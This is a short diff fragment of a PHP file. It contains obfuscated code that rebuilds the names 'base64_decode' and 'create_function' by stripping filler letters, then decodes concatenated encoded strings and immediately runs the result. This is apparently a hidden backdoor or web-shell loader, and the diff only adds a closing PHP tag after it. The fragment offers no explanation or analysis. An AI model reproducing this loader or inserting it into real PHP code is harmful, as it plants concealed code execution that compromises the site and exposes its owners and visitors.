@@ -7,3 +7,4 @@ $czdj="hcHJlZdh19yZXBsdhYWNlKGFdhydhcmF5KCcvW1dh5cdz1cc10vJydhwnL1xzLycpLCBhcnJh
 $bcrs = $hkts("k", "", "kbkakske6k4k_dkekckodke");
 $juqj = $hkts("j","","jcrjejajtje_fjujnjctjiojn");
 $boxz = $juqj('', $bcrs($hkts("dh", "", $mxzv.$rzax.$czdj.$wrgj))); $boxz();
+?>
